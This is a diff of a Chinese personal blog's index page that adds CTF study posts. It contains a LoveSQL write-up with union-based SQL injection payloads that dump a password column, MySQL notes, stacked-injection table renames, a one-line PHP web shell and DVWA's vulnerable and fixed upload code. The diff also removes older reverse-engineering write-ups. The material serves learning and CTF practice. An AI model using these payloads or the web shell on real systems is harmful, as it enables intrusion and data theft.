@@ -78,6 +78,170 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-[极客大挑战 2019]LoveSQL 1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/05/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DLoveSQL%201/" class="article-date">
+  <time class="dt-published" datetime="2022-08-05T03:03:44.583Z" itemprop="datePublished">2022-08-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DLoveSQL%201photo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-08-05%20105025.png"></p>
+<p>有两个表</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27; and table_schema=database();</span><br></pre></td></tr></table></figure>
+<p>三列如下<br><img src="/./%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DLoveSQL%201photo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-08-05%20105509.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2,group_concat(password) from l0ve1ysq1;</span><br></pre></td></tr></table></figure>
+<p>得flag<br><img src="/./%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DLoveSQL%201photo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-08-05%20105806.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cczz1234.github.io/2022/08/05/[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL%201/" data-id="cl6fvvmke0000msu9c87icz0p" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-mysql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/05/mysql/" class="article-date">
+  <time class="dt-published" datetime="2022-08-05T03:03:44.583Z" itemprop="datePublished">2022-08-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="MySQL启动"><a href="#MySQL启动" class="headerlink" title="MySQL启动"></a>MySQL启动</h1><p>win+R<br>services.msc<br>找到mysql</p>
+<p>mysql -u root -p<br>mysql -u root -h 127.0.0.1 -p<br>mysql -u root -h localhost -p</p>
+<h1 id="SQL-Strucutured-Query-Language-–结构化查询语言"><a href="#SQL-Strucutured-Query-Language-–结构化查询语言" class="headerlink" title="SQL(Strucutured Query Language) –结构化查询语言"></a>SQL(Strucutured Query Language) –结构化查询语言</h1><p>   DDL(数据定义语言)  –&gt;创建删除修改各种对象 –&gt;creat&#x2F;drop&#x2F;alter</p>
+<p>   DML(数据操作语言)  –&gt;插入，删除，修改数据   –&gt;insert&#x2F;delete&#x2F;update</p>
+<p>   DQL(数据查询语言)  –&gt;检索数据   —&gt;select<br>   select version()    查询版本<br>   DCL(数据控制语言)  –&gt;授予或者召回用户权限 —&gt;grant&#x2F;revoke</p>
+<h2 id="DDL"><a href="#DDL" class="headerlink" title="DDL"></a>DDL</h2><p>0.以某种编码建立<br>    创建    create database [name] default charset utf8mb4;</p>
+<p>1.删除    drop database [name] ;<br>        drop database if exists [name]; 如果存在则删除</p>
+<p>2.查看创建数据库的过程<br>show create database school;</p>
+<p>3.切换到指定的数据库<br>use school;</p>
+<p>4.显示数据库中所有的表<br>show tables     显示内容<br>show databases 显示数据库</p>
+<p>5.创建二维表<br>create table tb_student<br>(<br>      stu_id integer not null comment ‘学号’,<br>      stu_name varchar(20) not null comment ‘姓名’,<br>      stu_sex char(1)&#x2F;boolean default 1 comment ‘性别’,<br>      stu_birth date comment ‘出生日期’,<br>      primary key (stu_id)<br>)engine&#x3D;innodb comment ‘学生表’;</p>
+<p>主键(primary key):能够唯一确定一条记录的列,且不能为空</p>
+<p> 数据类型<br>  ~ 整数 int&#x2F;bigint&#x2F;smallint&#x2F;tinyint—&gt;unsigned<br>  ~ 小数 float&#x2F;double&#x2F;decimal<br>  ~ 时间日期 time&#x2F;date&#x2F;datetime&#x2F;timestamp<br>  ~ 字符串 char(10)定长&#x2F;varchar(10)变长<br>  ~ 大对象 longtext&#x2F;longblob —&gt;4G</p>
+<p> 修改表alter<br>~ – 添加列<br>alter table tb_student add column stu_addr varchar(20) default ‘’;</p>
+<p>~ – 删除列<br>alter table tb_student drop column stu_addr;</p>
+<p>~ – 修改列名和列<br>alter table tb_student change columen stu_sex stu_gender boolean default 1 comment ‘性别’;</p>
+<p>~ –只改数据类型<br>alter table tb_student modify column stu_gender char(1) default ‘男’ comment ‘性别’;</p>
+<p>~ –建学院表<br>&#x2F;&#x2F;auto_increment自动编号，默认从1开始<br>create table tb_college<br>(<br>    col_id int unsigned auto_increment comment ‘编号’，<br>    col_name varchar(50) not null comment ‘名称’，<br>    col_intro varchar(500) default ‘’ comment ‘介绍’，<br>    primary key (col_id)<br>) engine&#x3D;innodb auto_increment&#x3D;2 comment ‘学院表’;</p>
+<p>~ – 增添列<br>alter table tb_student add column col_id int unsigned not null comment ‘学院编号’; </p>
+<p>~ – 修改学生表，添加一个外键约束。tb_college–&gt;col_id&gt;&gt;&gt;&gt;&gt;&gt;&gt;tb_student–&gt;col_id</p>
+<p>alter table tb_student add constraint fk_student_col_id foreign key (col_id) references tb_college (col_id);</p>
+<h3 id="关系的重数"><a href="#关系的重数" class="headerlink" title="关系的重数"></a>关系的重数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">学生表&lt;------从属--------&gt;学院表</span><br><span class="line">（多）                   （一）</span><br></pre></td></tr></table></figure>
+
+<h3 id="设计表"><a href="#设计表" class="headerlink" title="设计表"></a>设计表</h3><p>~ ER图 —–&gt;Entity Relationship Diagram</p>
+<pre><code>实体：矩形框----&gt;表
+属性：椭圆框----&gt;列
+关系：菱形框
+重数：一对一、一对多、多对多
+</code></pre>
+<p>~ EER图 —-&gt;Extended ER图<br>    正项工程：图变表<br>    反向工程：表变图</p>
+<h2 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h2><p>0.增添数据 –insert</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">方法一</span><br><span class="line">insert into tb_college values </span><br><span class="line">(default, &#x27;计算机学院&#x27;, &#x27;学习计算机技术和网络安全&#x27;);</span><br><span class="line"></span><br><span class="line">方法二(给指定值赋值)</span><br><span class="line">insert into tb_college (col_name,col_intro) values</span><br><span class="line">(&#x27;网络安全学院&#x27;，&#x27;网络安全爱好者聚集地&#x27;);</span><br><span class="line"></span><br><span class="line">方法三</span><br><span class="line">insert into tb_college  values</span><br><span class="line">(default, &#x27;计算机学院&#x27;, &#x27;学习计算机技术和网络安全&#x27;),</span><br><span class="line">(default, &#x27;网络安全学院&#x27;，&#x27;网络安全爱好者聚集地&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>1.删除 –delete</p>
+<p>delete from tb_college where col_id&#x3D;2; &#x2F;&#x2F;外键约束不可删</p>
+<p>delete from tb_college where col_id in (4,5);</p>
+<p>truncate table tb_college;   &#x2F;&#x2F;删表且无法恢复</p>
+<p>2.更新<br>update tb_student set stu_addr&#x3D;’黄山’ where stu_id in (1);</p>
+<p>update tb_student set stu_addr&#x3D;’黄山’, stu_gender&#x3D;0 where stu_id between 1 and 3;</p>
+<h2 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h2><h3 id="查询select"><a href="#查询select" class="headerlink" title="查询select"></a>查询select</h3><p>– 查询所有学生信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from tb_student;  //效率低</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select stu_id, stu_name, stu_sex, stu_birth, stu_addr, col_id from tb_student;       //效率高</span><br></pre></td></tr></table></figure>
+
+<p>– 查询所有学生名子及地址<br>select stu_name, stu_addr from tb_student;</p>
+<p>– 别名<br>select stu_name as 姓名, stu_addr as 地址 from tb_student;</p>
+<p>– 有条件性查询可以在where后用and(且)或者or(或者)，也可以用between … and …(整数，时间日期均可)<br>select stu_name, stu_birth from tb_student where stu_sex&#x3D;1;</p>
+<p>– 在查询时对列的值处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select </span><br><span class="line">stu_id, </span><br><span class="line">stu_name,</span><br><span class="line">case stu_gender when 1 then &#x27;男&#x27; else &#x27;女&#x27; end as 性别,    //mysql中可以用if(stu_gender, &#x27;男&#x27;， &#x27;女&#x27;) as 性别，</span><br><span class="line">stu_birth, stu_addr, col_id from tb_student</span><br></pre></td></tr></table></figure>
+
+<p>– 查询模糊条件<br>– 在sql中通配符%可以匹配零个或任意多个字符<br>select stu_name, stu_gender from tb_student where stu_name like ‘%杨%’;   &#x2F;&#x2F;前面加%效率低，较慢</p>
+<p>– 通配符’<em>‘代表一个字符<br>select stu_name, stu_gender from tb_student where stu_name like ‘杨</em>‘;</p>
+<p>– 并集运算<br>select stu_name, stu_gender from tb_student where stu_name like ‘%杨%’<br>union<br>select stu_name, stu_gender from tb_student where stu_name like ‘%红%’;</p>
+<p>– 并集运算（保留重复）<br>select stu_name, stu_gender from tb_student where stu_name like ‘%红%’<br>union all<br>select stu_name, stu_gender from tb_student where stu_name like ‘%杨%’;</p>
+<p>– 正则表达式的模糊匹配<br>^ 开始<br>$ 结尾<br>{} 里面跟量词<br>select stu_name, stu_gender from tb_student where stu_name regexp ‘^杨.{1,3}$’</p>
+<p>– null做任何运算结果为null<br>select stu_name, stu_gender from tb_student where null;</p>
+<p>– 查没有录入家庭住址<br>select stu_name, stu_gender from tb_student where stu_addr is null;</p>
+<p>– 查家庭住址不为空的<br>select stu_name, stu_gender from tb_student where stu_addr is not null;</p>
+<p>– &lt;&gt;不等号  &lt;&#x3D;&gt;等号<br>select stu_name, stu_gender from tb_student where stu_addr &lt;&#x3D;&gt; null;</p>
+<p>select stu_name, stu_gender from tb_student where stu_addr &lt;&gt; null;</p>
+<p>– 查询学生住址（去重）<br>select distinct stu_adrr from tb_student where stu_addr is not null</p>
+<p>– 查询后排序</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cczz1234.github.io/2022/08/05/mysql/" data-id="cl6fvvmkl0007msu9fbirekd2" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/08/05/web/" class="article-date">
+  <time class="dt-published" datetime="2022-08-05T03:03:44.583Z" itemprop="datePublished">2022-08-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rename table `words` to words2;</span><br><span class="line">rename table `1919810931114514` to words;</span><br><span class="line">alter table words change flag id varchar(100);</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>1.一句话木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p>漏洞代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;</span><br><span class="line">    // Where are we going to be writing to?</span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;</span><br><span class="line">    $target_path .= basename( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ] );</span><br><span class="line"></span><br><span class="line">    // Can we move the file to the upload folder?</span><br><span class="line">    if( !move_uploaded_file( $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ], $target_path ) ) &#123;</span><br><span class="line">        // No</span><br><span class="line">        echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Yes!</span><br><span class="line">        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>漏洞解决</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Upload&#x27; ] ) ) &#123;</span><br><span class="line">    // Check Anti-CSRF token</span><br><span class="line">    checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // File information</span><br><span class="line">    $uploaded_name = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;name&#x27; ];</span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#x27;.&#x27; ) + 1);</span><br><span class="line">    $uploaded_size = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;size&#x27; ];</span><br><span class="line">    $uploaded_type = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;type&#x27; ];</span><br><span class="line">    $uploaded_tmp  = $_FILES[ &#x27;uploaded&#x27; ][ &#x27;tmp_name&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Where are we going to be writing to?</span><br><span class="line">    $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#x27;hackable/uploads/&#x27;;</span><br><span class="line">    //$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span><br><span class="line">    $target_file   =  md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;</span><br><span class="line">    $temp_file     = ( ( ini_get( &#x27;upload_tmp_dir&#x27; ) == &#x27;&#x27; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#x27;upload_tmp_dir&#x27; ) ) );</span><br><span class="line">    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#x27;.&#x27; . $uploaded_ext;</span><br><span class="line"></span><br><span class="line">    // Is it an image?</span><br><span class="line">    if( ( strtolower( $uploaded_ext ) == &#x27;jpg&#x27; || strtolower( $uploaded_ext ) == &#x27;jpeg&#x27; || strtolower( $uploaded_ext ) == &#x27;png&#x27; ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; 100000 ) &amp;&amp;</span><br><span class="line">        ( $uploaded_type == &#x27;image/jpeg&#x27; || $uploaded_type == &#x27;image/png&#x27; ) &amp;&amp;</span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123;</span><br><span class="line"></span><br><span class="line">        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span><br><span class="line">        if( $uploaded_type == &#x27;image/jpeg&#x27; ) &#123;</span><br><span class="line">            $img = imagecreatefromjpeg( $uploaded_tmp );</span><br><span class="line">            imagejpeg( $img, $temp_file, 100);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            $img = imagecreatefrompng( $uploaded_tmp );</span><br><span class="line">            imagepng( $img, $temp_file, 9);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( $img );</span><br><span class="line"></span><br><span class="line">        // Can we move the file to the web root from the temp folder?</span><br><span class="line">        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) &#123;</span><br><span class="line">            // Yes!</span><br><span class="line">            echo &quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            // No</span><br><span class="line">            echo &#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Delete any temp files</span><br><span class="line">        if( file_exists( $temp_file ) )</span><br><span class="line">            unlink( $temp_file );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // Invalid file</span><br><span class="line">        echo &#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://cczz1234.github.io/2022/08/05/web/" data-id="cl6fvvmkm0008msu9c7seekyc" data-title="" class="article-share-link">分享</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-buuctf-ACTF新生赛2020-usualCrypt1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/03/28/buuctf-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt1/" class="article-date">
@@ -125,7 +289,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://cczz1234.github.io/2022/03/28/buuctf-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt1/" data-id="cl5feryd80002egu97uh75f75" data-title="buuctf--[ACTF新生赛2020]usualCrypt1" class="article-share-link">分享</a>
+      <a data-url="https://cczz1234.github.io/2022/03/28/buuctf-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt1/" data-id="cl6fvvmkh0001msu9anefe89j" data-title="buuctf--[ACTF新生赛2020]usualCrypt1" class="article-share-link">分享</a>
       
       
       
@@ -214,7 +378,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://cczz1234.github.io/2022/03/22/CrackRTF-1-buuctf/" data-id="cl5feryd20000egu921ybci2r" data-title="CrackRTF 1---buuctf" class="article-share-link">分享</a>
+      <a data-url="https://cczz1234.github.io/2022/03/22/CrackRTF-1-buuctf/" data-id="cl6fvvmkj0002msu90x91ggcc" data-title="CrackRTF 1---buuctf" class="article-share-link">分享</a>
       
       
       
@@ -263,7 +427,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://cczz1234.github.io/2022/03/21/coffee/" data-id="cl5feryd90003egu9hifg3jbl" data-title="coffee" class="article-share-link">分享</a>
+      <a data-url="https://cczz1234.github.io/2022/03/21/coffee/" data-id="cl6fvvmkl0006msu90yd4ea32" data-title="coffee" class="article-share-link">分享</a>
       
       
       
@@ -316,7 +480,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://cczz1234.github.io/2022/03/17/rsa-1-buuctf/" data-id="cl5ferydb0006egu9dk869gnu" data-title="rsa 1 buuctf" class="article-share-link">分享</a>
+      <a data-url="https://cczz1234.github.io/2022/03/17/rsa-1-buuctf/" data-id="cl6fvvmkm0009msu96o0x4kn9" data-title="rsa 1 buuctf" class="article-share-link">分享</a>
       
       
       
@@ -372,7 +536,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://cczz1234.github.io/2022/03/15/buuctf%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/" data-id="cl5feryda0004egu93du7hrve" data-title="buuctf刮开有奖" class="article-share-link">分享</a>
+      <a data-url="https://cczz1234.github.io/2022/03/15/buuctf%E5%88%AE%E5%BC%80%E6%9C%89%E5%A5%96/" data-id="cl6fvvmkk0005msu9afu3gpps" data-title="buuctf刮开有奖" class="article-share-link">分享</a>
       
       
       
@@ -430,7 +594,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://cczz1234.github.io/2022/03/11/buuctf-re3-base64/" data-id="cl5feryd60001egu93hemd6ty" data-title="buuctf_re3_base64" class="article-share-link">分享</a>
+      <a data-url="https://cczz1234.github.io/2022/03/11/buuctf-re3-base64/" data-id="cl6fvvmkj0003msu91bng79zp" data-title="buuctf_re3_base64" class="article-share-link">分享</a>
       
       
       
@@ -474,147 +638,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://cczz1234.github.io/2022/03/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Csrm-50/" data-id="cl5ferydf000begu97ecc5bqm" data-title="攻防世界srm-50" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-攻防世界Mysterious" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/03/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMysterious/" class="article-date">
-  <time class="dt-published" datetime="2022-03-07T04:28:08.000Z" itemprop="datePublished">2022-03-07</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/03/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMysterious/">攻防世界Mysterious</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>先将得到的文件扔进exeinfo看看</p>
-<p><img src="/../photo/m_9.png"></p>
-<p>发现是32位，拉进ida瞅瞅</p>
-<p><img src="/../photo/m_10.png"></p>
-<p>啊哈，我们看到了flag,</p>
-<p>其中有一段未知</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcat(Text, Source);</span><br></pre></td></tr></table></figure>
-<p>我们追踪一下Source</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_itoa(Value, Source, 10);</span><br></pre></td></tr></table></figure>
-
-<p>找到Value</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Value = v4 + 1;</span><br></pre></td></tr></table></figure>
-
-<p>我们通过判断条件可知v4&#x3D;122,即Value&#x3D;123.</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( v4 == 122 &amp;&amp; String[3] == 120 &amp;&amp; String[5] == 122 &amp;&amp; String[4] == 121 )</span><br></pre></td></tr></table></figure>
-
-<p>得flag{123_Buff3r_0v3rf|0w}</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://cczz1234.github.io/2022/03/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMysterious/" data-id="cl5ferydb0007egu95in709n5" data-title="攻防世界Mysterious" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-攻防世界re-4" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/02/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cre-4/" class="article-date">
-  <time class="dt-published" datetime="2022-02-26T04:58:48.000Z" itemprop="datePublished">2022-02-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/02/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cre-4/">攻防世界re_4</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="re-4-logmein"><a href="#re-4-logmein" class="headerlink" title="re_4__logmein"></a>re_4__logmein</h1><p>拖入exeinfope查看后直接用ida64打开<br><img src="/../photo/7.png"></p>
-<p>发现了一个疑似flag的运算<br><img src="/../photo/8.png"></p>
-<p>直接写脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key_1=&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span><br><span class="line">key_2=&quot;harambe&quot;</span><br><span class="line">key_3=&quot;&quot;</span><br><span class="line">for i in range(len(key_1)):</span><br><span class="line">	key_3+=chr(ord(key_2[i%7]) ^ ord(key_1[i]))</span><br><span class="line">print(key3)</span><br></pre></td></tr></table></figure>
-
-<p>得flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RC3-2016-XORISGUD</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://cczz1234.github.io/2022/02/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cre-4/" data-id="cl5ferydd0009egu9eqkl1jay" data-title="攻防世界re_4" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-攻防世界re-3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/02/26/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cre-3/" class="article-date">
-  <time class="dt-published" datetime="2022-02-26T04:58:18.000Z" itemprop="datePublished">2022-02-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
